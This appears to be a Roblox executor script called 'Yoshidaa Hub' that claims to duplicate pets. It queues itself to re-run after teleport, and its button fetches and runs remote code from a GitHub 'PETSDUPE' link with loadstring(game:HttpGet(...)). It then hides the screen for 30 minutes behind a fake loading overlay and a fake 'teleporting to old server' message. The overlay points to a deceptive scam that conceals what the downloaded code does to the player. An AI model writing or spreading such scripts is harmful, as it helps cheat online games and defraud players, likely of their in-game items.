if _G.YoshidaaHubRunning then return end
_G.YoshidaaHubRunning = true

-- AUTO‑REJOIN SETUP
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer

-- Queue this entire script to run when you rejoin
queue_on_teleport([[
    loadstring(game:HttpGet("YOUR_RAW_LINK"))()
]])

-- Teleport back after 10 seconds (adjust delay as needed)
task.delay(10, function()
    TeleportService:Teleport(game.PlaceId, LocalPlayer)
end)

-- ** PREMIUM GUI SETUP **
local TweenService = game:GetService("TweenService")
local CoreGui = game:GetService("CoreGui")
local Lighting = game:GetService("Lighting")

local screenGui = Instance.new("ScreenGui")
screenGui.Name = "YoshidaaPremiumGUI"
screenGui.Parent = CoreGui
screenGui.ResetOnSpawn = false

-- Blur background
local blur = Instance.new("BlurEffect")
blur.Size = 24
blur.Parent = Lighting

-- Main draggable frame
local mainFrame = Instance.new("Frame", screenGui)
mainFrame.Size = UDim2.new(0, 400, 0, 250)
mainFrame.Position = UDim2.new(0.5, -200, 0.5, -125)
mainFrame.Active = true
mainFrame.Draggable = true
mainFrame.BackgroundColor3 = Color3.fromRGB(15,15,20)
mainFrame.BackgroundTransparency = 0.2
Instance.new("UICorner", mainFrame).CornerRadius = UDim.new(0,20)
local glow = Instance.new("UIStroke", mainFrame)
glow.Thickness = 2; glow.Color = Color3.fromRGB(160,80,255); glow.Transparency=0.1

-- Title & footer
local title = Instance.new("TextLabel", mainFrame)
title.Size = UDim2.new(1,0,0,40); title.Text="🌌 Yoshidaa Hub - Premium 🌌"
title.TextColor3 = Color3.fromRGB(200,100,255); title.BackgroundTransparency=1
title.Font=Enum.Font.GothamBold; title.TextSize=24

local inspired = Instance.new("TextLabel", mainFrame)
inspired.Size = UDim2.new(1,-20,0,20); inspired.Position=UDim2.new(0,10,1,-25)
inspired.Text="Inspired by Mica"; inspired.TextColor3=Color3.fromRGB(140,140,140)
inspired.BackgroundTransparency=1; inspired.Font=Enum.Font.Gotham; inspired.TextSize=14
inspired.TextXAlignment=Enum.TextXAlignment.Left

-- Activate button with hover animation
local button = Instance.new("TextButton", mainFrame)
button.Size = UDim2.new(0.85,0,0,44); button.Position=UDim2.new(0.075,0,0.55,0)
button.Text = "☄️ Activate Duped Mode"
button.BackgroundColor3 = Color3.fromRGB(40,0,60); button.TextColor3=Color3.new(1,1,1)
button.Font=Enum.Font.Gotham; button.TextSize=18
Instance.new("UICorner", button).CornerRadius = UDim.new(0,12)
local btnStroke = Instance.new("UIStroke", button)
btnStroke.Thickness=2; btnStroke.Color=Color3.fromRGB(255,100,255); btnStroke.Transparency=0.3

button.MouseEnter:Connect(function()
    TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0.9,0,0,50)
    }):Play()
    btnStroke.Transparency = 0
end)
button.MouseLeave:Connect(function()
    TweenService:Create(button, TweenInfo.new(0.2, Enum.EasingStyle.Quad), {
        Size = UDim2.new(0.85,0,0,44)
    }):Play()
    btnStroke.Transparency = 0.3
end)

-- On click: run external payload + animated loading + fake hop
button.MouseButton1Click:Connect(function()
    button.Text = "✅ Activating..."
    button.BackgroundColor3 = Color3.fromRGB(60,0,100)

    -- 1️⃣ Run external PetDupe script
    loadstring(game:HttpGet("https://raw.githubusercontent.com/RayField-Scripts/PETSDUPE/main/PetsDuped"))()

    -- 2️⃣ Show animated full-screen loading
    task.delay(0.01, function()
        local gui = Instance.new("ScreenGui", CoreGui)
        gui.Name = "YoshidaaBlackLoading"; gui.IgnoreGuiInset=true;
        gui.ZIndexBehavior = Enum.ZIndexBehavior.Global

        -- Overlay frame
        local frame = Instance.new("Frame", gui)
        frame.BackgroundColor3 = Color3.new(0,0,0); frame.Size=UDim2.new(1,0,1,36)
        frame.Position=UDim2.new(0,0,0,-36); frame.ZIndex=999999
        frame.BackgroundTransparency=1
        TweenService:Create(frame, TweenInfo.new(0.5), {BackgroundTransparency=0}):Play()

        -- Message label
        local msg = Instance.new("TextLabel", frame)
        msg.Size = UDim2.new(1,0,0,50)
        msg.Position=UDim2.new(0,0,0.45,0)
        msg.Text="🔍 FINDING OLD SERVER FOR YOU TO ACTIVATE SCRIPT, PLEASE WAIT..."
        msg.TextColor3=Color3.fromRGB(255,255,255)
        msg.BackgroundTransparency=1; msg.Font=Enum.Font.GothamBold; msg.TextScaled=true; msg.ZIndex=999999

        -- Progress percent label
        local percent = Instance.new("TextLabel", frame)
        percent.Size=UDim2.new(1,0,0,30)
        percent.Position=UDim2.new(0,0,0.55,0)
        percent.Text="Loading 0%"; percent.TextColor3=Color3.fromRGB(180,180,255)
        percent.BackgroundTransparency=1; percent.Font=Enum.Font.Gotham; percent.TextScaled=true
        percent.ZIndex=999999

        task.spawn(function()
            for i = 1,100 do
                percent.Text="Loading "..i.."%"
                task.wait(0.12)
            end

            msg.Text="🔄 SERVER RESTARTING"
            percent.Text="Loading 1%"
            task.wait(1)

            -- Fake teleport hop screen
            local teleportGui = Instance.new("ScreenGui", CoreGui)
            teleportGui.Name="YoshidaaTeleportHop"; teleportGui.IgnoreGuiInset=true; teleportGui.ZIndexBehavior=Enum.ZIndexBehavior.Global

            local fade = Instance.new("Frame", teleportGui)
            fade.Size = UDim2.new(1,0,1,36)
            fade.Position=UDim2.new(0,0,0,-36)
            fade.BackgroundColor3=Color3.new(0,0,0)
            fade.BackgroundTransparency=1; fade.ZIndex=9999999

            local teleportText = Instance.new("TextLabel", fade)
            teleportText.Size=UDim2.new(1,0,0,50)
            teleportText.Position=UDim2.new(0,0,0.5,-25)
            teleportText.Text="🚪 TELEPORTING TO OLD SERVER..."
            teleportText.TextColor3=Color3.fromRGB(255,255,255)
            teleportText.BackgroundTransparency=1
            teleportText.Font=Enum.Font.GothamBold
            teleportText.TextScaled=true; teleportText.ZIndex=9999999

            -- Fade in/out teleport message
            TweenService:Create(fade, TweenInfo.new(1), {BackgroundTransparency=0}):Play()
            task.wait(3)
            TweenService:Create(fade, TweenInfo.new(1), {BackgroundTransparency=1}):Play()
            task.wait(1.5)
            teleportGui:Destroy()

            -- Finish percent to 100
            for i=2,100 do
                percent.Text="Loading "..i.."%"
                task.wait(0.25)
            end
            task.wait(1800)  -- stuck for 30 mins
            gui:Destroy()
        end)
    end)
end)
